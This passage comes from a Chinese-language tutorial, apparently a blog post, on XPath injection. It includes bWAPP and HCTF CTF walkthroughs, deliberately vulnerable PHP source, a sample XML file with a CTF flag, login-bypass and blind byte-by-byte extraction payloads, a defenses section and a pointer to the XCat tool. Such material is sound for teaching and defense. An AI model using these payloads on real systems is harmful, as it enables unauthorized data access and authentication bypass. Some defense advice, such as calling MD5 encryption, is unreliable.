<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506002608772.png" alt="image-20230506002608772"></p>
<p>把中括号换成圆括号也不行。就在我郁闷的时候，一拍脑袋，函数一般是放在中括号里，用来增加查询条件的，这有点像where<br>
那么试试：genre=action’)] | //* | //*[(’ &amp;action=search</p>
<p>这里对这个payload的理解: 第一个|前面啥也查不到,因此转到中间的语句,返回//*  (文档中所有元素),接着又查询第三个,虽然search查不到,但前面有   //*  即://*[(‘’)]/movie,返回文档中所有movie元素</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506005328819.png" alt="image-20230506005328819"></p>
<h2 id="0x11-xpath挖掘利用"><strong>0x11 xpath挖掘利用</strong></h2>
<p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p>
<p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p>
<p>判断依据：主要根据错误信息页面判断以及查看源码进行分析。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506005727317.png" alt="image-20230506005727317"></p>
<p>Example：Bwapp</p>
<p>首先这是这个Get方式请求验证，因此对get的参数进行注入测试，发现报错信息，说明是可能通过xml存储于前端交互。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506005746149.png" alt="image-20230506005746149"></p>
<p>然后构造xpath查询语句//users/user[loginID/text()=‘’ and password/text()=‘’],因此’or 1=1 or ‘’=‘或者’ or ‘1’='1等使其为真可以。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506005815150.png" alt="image-20230506005815150"></p>
<p>Example:hctf</p>
<p><strong>index.html</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$re</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'and'</span>,<span class="hljs-string">'or'</span>,<span class="hljs-string">'count'</span>,<span class="hljs-string">'select'</span>,<span class="hljs-string">'from'</span>,<span class="hljs-string">'union'</span>,<span class="hljs-string">'group'</span>,<span class="hljs-string">'by'</span>,<span class="hljs-string">'limit'</span>,<span class="hljs-string">'insert'</span>,<span class="hljs-string">'where'</span>,<span class="hljs-string">'order'</span>,<span class="hljs-string">'alter'</span>,<span class="hljs-string">'delete'</span>,<span class="hljs-string">'having'</span>,<span class="hljs-string">'max'</span>,<span class="hljs-string">'min'</span>,<span class="hljs-string">'avg'</span>,<span class="hljs-string">'sum'</span>,<span class="hljs-string">'sqrt'</span>,<span class="hljs-string">'rand'</span>,<span class="hljs-string">'concat'</span>,<span class="hljs-string">'sleep'</span>);
<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">'injection'</span>,<span class="hljs-string">'c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24='</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">100000</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">'t3stt3st.xml'</span>)) {
  <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">'t3stt3st.xml'</span>);
  <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'user'</span>];
  <span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$re</span>, <span class="hljs-string">' '</span>, <span class="hljs-variable">$user</span>);
 
<span class="hljs-comment">// $user=str_replace("'", "&amp;apos", $user);</span>
 
  <span class="hljs-variable">$query</span>=<span class="hljs-string">"user/username[@name='"</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">"']"</span>;
 
  <span class="hljs-variable">$ans</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);
 
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ans</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$x_value</span>)
 {
 
  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">": "</span> . <span class="hljs-variable">$x_value</span>;
 
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;
 
 }
 
}
 
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>t3stt3et.xml</strong></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">root1</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user1'</span>&gt;</span>user1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:1<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user2'</span>&gt;</span>user2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:2<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user3'</span>&gt;</span>user3<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:3<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user4'</span>&gt;</span>user4<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:4<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user5'</span>&gt;</span>user5<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:5<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user6'</span>&gt;</span>user6<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:6<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user7'</span>&gt;</span>user7<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:7<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user8'</span>&gt;</span>user8<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:8<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user9'</span>&gt;</span>user9<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:9<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">hctfadmin</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'hctf1'</span>&gt;</span>hctf<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
 <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>flag:hctf{Dd0g_fac3_t0_k3yboard233}<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
 <span class="hljs-tag">&lt;/<span class="hljs-name">hctfadmin</span>&gt;</span>
 
<span class="hljs-tag">&lt;/<span class="hljs-name">root1</span>&gt;</span></code></pre>
<p>通过查看源码$query，然后构造payload: <code>']|//*|['</code>    回显出flag</p>
<h2 id="0x12浅谈xpath注入检测思路和方法"><strong>0x12浅谈XPath注入检测思路和方法</strong></h2>
<p>XML不是保存企业数据的，但是很多情况下都用来保存应用程序配置数据，小型应用程序也保存简单信息，例如角色权限等等,下面给出一个XML的列子</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">addressBooke</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>abcdefg<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>13000000000<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>abcdefg<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>13000000001<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>abcdefg<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>40<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>13000000002<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span></code></pre>
<p>原理类似SQL注入，构建新的查询逻辑来进行攻击,但是要注意，关键词像函数这种的区分大小写<br>
<strong>1.构建新的逻辑实现注入</strong></p>
<pre><code class="hljs plaintext">or 1=1
and 1=2
'or 'a'='a
'and 'a'='b</code></pre>
<p>一个字节一个字节的提取出信息:</p>
<pre><code class="hljs plaintext">'or //address[name/text()='Tom' and substring(password/text(),1,1)）] ='a' and 'a'='a</code></pre>
<p>返回正常则判断正确，等同于下面的查询：</p>
<pre><code class="hljs plaintext">//address[name/text()='' or //address[name/text()='Tom' and substring(password/text(),1,1)）] ='a' ]and 'a'='a]/phone/text()</code></pre>
<p>通过查询名字的输入 却查询到了了tom的密码首位，尝试攻击每一个字符位置并测试每一个可能的值，获得密码<br>
<strong>2.当然了大部分情况下，我们不能够知道任何节点的名称或者说只能知道一部分，可使用盲注XPath</strong><br>
相当于SQL盲注（大家都对语句嫩熟于心，不多提了）</p>
<p><strong>首先提取父节点的名字：</strong></p>
<pre><code class="hljs plaintext">'or substring(name(parent::*[position()=1]),1,1)='a  正常
'or substring(name(parent::*[position()=1]),2,1)='d  正常
 ........</code></pre>
<p>父节点名字为address 是元素节点<br>
<strong>提取子节点名字</strong></p>
<pre><code class="hljs plaintext">'or substring(//address[1]/*[2],1,1)='p' or 'a'='a 正常
'or substring(//address[1]/*[2],2,1)='a' or 'a'='a 正常
........</code></pre>
<p>二号子节点名称为password<br>
<strong>提取子节点的值：</strong></p>
<p>基于原理：//address[1]/*[2]/text() -&gt; tom的password 但是这个不会输出<br>
我们通过布尔型来查询XML所有的内容</p>
<pre><code class="hljs plaintext">'or substring(//address[1]/*[2]/text(),1,1)='a' or'a'='a 正常
'or substring(//address[1]/*[2]/text(),1,1)='b' or'a'='a 正常
......</code></pre>
<p>第二个子节点值为abcdefg</p>
<p><strong>测试步骤：</strong><br>
提交这些看能否使得状态改变 （count返回子节点数量）</p>
<pre><code class="hljs plaintext">' or count(parent::*[position()=1])=0 or 'a'='b 状态1
' or count(aprent::*[position()=1])&gt;0 or 'a'='b 状态改变</code></pre>
<p>数字型参数：</p>
<pre><code class="hljs plaintext">1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])=0 状态改变</code></pre>
<p>确定了存在注入点，用上面的方法注入就可以了！</p>
<h2 id="0x13-经典xpath源码">0x13 经典xpath源码</h2>
<p><strong>index.php：</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
<span class="hljs-variable">$re</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'and'</span>,<span class="hljs-string">'or'</span>,<span class="hljs-string">'count'</span>,<span class="hljs-string">'select'</span>,<span class="hljs-string">'from'</span>,<span class="hljs-string">'union'</span>,<span class="hljs-string">'group'</span>,<span class="hljs-string">'by'</span>,<span class="hljs-string">'limit'</span>,<span class="hljs-string">'insert'</span>,<span class="hljs-string">'where'</span>,<span class="hljs-string">'order'</span>,<span class="hljs-string">'alter'</span>,<span class="hljs-string">'delete'</span>,<span class="hljs-string">'having'</span>,<span class="hljs-string">'max'</span>,<span class="hljs-string">'min'</span>,<span class="hljs-string">'avg'</span>,<span class="hljs-string">'sum'</span>,<span class="hljs-string">'sqrt'</span>,<span class="hljs-string">'rand'</span>,<span class="hljs-string">'concat'</span>,<span class="hljs-string">'sleep'</span>);
 
<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">'injection'</span>,<span class="hljs-string">'c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24='</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">100000</span>);
 
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">'t3stt3st.xml'</span>)) {
 
    <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">'t3stt3st.xml'</span>);
 
    <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'user'</span>];
 
    <span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$re</span>, <span class="hljs-string">' '</span>, <span class="hljs-variable">$user</span>);
 
  <span class="hljs-comment">//  $user=str_replace("'", "&amp;apos", $user);</span>
 
    <span class="hljs-variable">$query</span>=<span class="hljs-string">"user/username[@name='"</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">"']"</span>;
 
  
 
    <span class="hljs-variable">$ans</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);
 
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ans</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$x_value</span>)
 
    {
 
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">":  "</span> . <span class="hljs-variable">$x_value</span>;
 
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;
 
    }
 
}
 
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong><a target="_blank" rel="noopener" href="//t3stt3st.xml">//t3stt3st.xml</a></strong></p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
 
<span class="hljs-tag">&lt;<span class="hljs-name">root1</span>&gt;</span>
 
    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user1'</span>&gt;</span>user1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:1<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user2'</span>&gt;</span>user2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:2<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user3'</span>&gt;</span>user3<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:3<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user4'</span>&gt;</span>user4<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:4<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user5'</span>&gt;</span>user5<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:5<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user6'</span>&gt;</span>user6<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:6<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user7'</span>&gt;</span>user7<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:7<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user8'</span>&gt;</span>user8<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:8<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'user9'</span>&gt;</span>user9<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:9<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
 
    <span class="hljs-tag">&lt;<span class="hljs-name">hctfadmin</span>&gt;</span>    
 
        <span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'hctf1'</span>&gt;</span>hctf<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
 
        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>flag:hctf{Dd0g_fac3_t0_k3yboard233}<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
 
    <span class="hljs-tag">&lt;/<span class="hljs-name">hctfadmin</span>&gt;</span>
 
<span class="hljs-tag">&lt;/<span class="hljs-name">root1</span>&gt;</span></code></pre>
<p>从index.php源码可知XPath查询语句为$query=“user/username[@name='”.$user.“']”，  且$user经过关键字替换。但是黑名单$re中都为SQL关键字，所以并不影响对XPath进行注入。我们可以构造payload如 ']|//*|zzz['来进行注入，获取文档中的所有元素节点。</p>
<h2 id="0x14-xpath危害"><strong>0x14 xpath危害</strong></h2>
<ul>
<li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据；</li>
<li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li>
<li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li>
<li>xpath的具体危害：</li>
</ul>
<p>下面我将从这两个方面来分别演示这两种危害。</p>
<p><strong>（1）绕过验证</strong></p>
<p>首先这里有一个登录身份验证的程序，所有的身份数据都存储在一个名为 UsersDataBase.xml 的文件里。 通过 XPath 查询 xml 文件，将用户提交的用户名和密码与 xml 文件中的用户名密码做比对来验证身份。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011021529.png" alt="image-20230506011021529"></p>
<p>UsersDataBase.xml 的结构如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011035708.png" alt="image-20230506011035708"></p>
<p>一般情况下，输入错误的用户名或密码会导致身份认证失败：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011051436.png" alt="image-20230506011051436"></p>
<p>然而在后台的身份认证程序中有这样一句 XPath 查询语句</p>
<blockquote>
<p>$xpath = “//users/user[username/text()='”.$_POST[“username”].“’ and password/text()='”.$_POST[“password”].“']”;</p>
</blockquote>
<p>可以看到在 XPath 查询语句中并未对用户的输入做任何处理，这就直接导致一个注入点</p>
<p>我们可以构造如下的 payload:</p>
<blockquote>
<p>Username: ’ or ‘1’ = '1</p>
<p>Password: ’ or ‘1’ = '1</p>
</blockquote>
<p>那么整个 XPath 查询语句就变成了这个样子</p>
<blockquote>
<p>$xpath = “//users/user[username/text()=‘’ or ‘1’ = ‘1’ and password/text()=‘’ or ‘1’ = ‘1’]”;</p>
</blockquote>
<p>整个查询语句恒成立，就直接导致了身份认证被绕过。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011142727.png" alt="image-20230506011142727"></p>
<p><strong>2.信息泄露</strong></p>
<p>大多数情况下，当服务器返回数据时，都会对这些数据做一些处理。比如如果服务器返回一些错误信息，那么最终会被过滤掉，不会出现在用户的页面里。将尽可能少的信息暴露给用户，将可以提高安全性。但是即使错误信息被过滤掉，我们依然可以从服务器给出的不同返回结果推测出服务器做出了何种响应。作为攻击者可以提交一段包含 XPath 函数的 Payload，通过服务器给出的不同响应，判断得到我们想知道的信息。这就是 XPath 盲注。</p>
<p>下面这是一个通过用户名的ID来得到用户名的程序。当然具体场景也可能是通过名字来查询身份证号码等等，这里只做演示。</p>
<p>正常情况下，输入用户的 ID，就会得到相应的用户名。当查询语句恒成立时（如构造 Payload 为’ or ‘1’ =  '1 时），就会返回第一个节点的用户名 “Alice”（这是程序本身的 bug ）。而当查询语句错误或该 ID 在 xml 数据库中不存在时，就什么都不返回。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011205632.png" alt="image-20230506011205632"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230506011212235.png" alt="image-20230506011212235"></p>
<p>利用这点，我们就可以构造如下 Payload，比如：来查询整个 xml 文档的根节点的第一个字母是否为“u”</p>
<blockquote>
<p>’ or substring(name(parent::*[position()=1]),1,1)='u</p>
</blockquote>
<p>返回结果为 “Alice”，就说明整个 xml 文档的根节点的第一个字母是 “u”，反之如果什么都没有返回，则说明根节点的第一个字母不是 “u”。以此类推，我们就可以历遍整个 xml 文档了。这也是 xml和其他数据库相比最大的威胁所在了，因为它没有访问控制和身份验证。</p>
<h2 id="0x15-xpath防御">0x15 xpath防御</h2>
<ul>
<li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li>
<li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换</li>
<li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类）</li>
<li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。如下代码可以通过创建保存查询的外部文件使查询参数化：</li>
</ul>
<blockquote>
<p>declare variable $loginID as xs：string external；</p>
<p>declare variable $password as xs：string external；</p>
<p>//users/user[@loginID=$loginID and@password= $password]</p>
</blockquote>
<p>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。</p>
<ul>
<li>验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。</li>
</ul>
<p><strong>总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量</strong></p>
<h2 id="0x16-xpath工具">0x16 xpath工具</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/orf/xcat">XCat</a></li>
</ul>
<p>XCat是一个用来利用XPath盲注的命令行程序。它可以用来检索正在被易受攻击的XPath查询处理的整个XML文档，读取主机文件系统上的任意文件，并利用无限制的HTTP请求使服务器直接向xcat发送数据(OOB带外通信)</p>
<p>Xcat是python的命令行程序利用Xpath的注入漏洞在Web应用中检索XML文档,下载地址：<a target="_blank" rel="noopener" href="https://github.com/orf/xcat">https://github.com/orf/xcat</a></p>
<p>使用说明：<a target="_blank" rel="noopener" href="http://xcat.readthedocs.io/en/latest/#about-xcat">http://xcat.readthedocs.io/en/latest/#about-xcat</a></p>
<blockquote>
<p>python3.4.1环境:</p>
<p>pip install xcat</p>
</blockquote>
<p>常用命令读取xml文件：(这命令老了,我现在也不知道现版本咋用,有时间研究吧…)</p>
<blockquote>
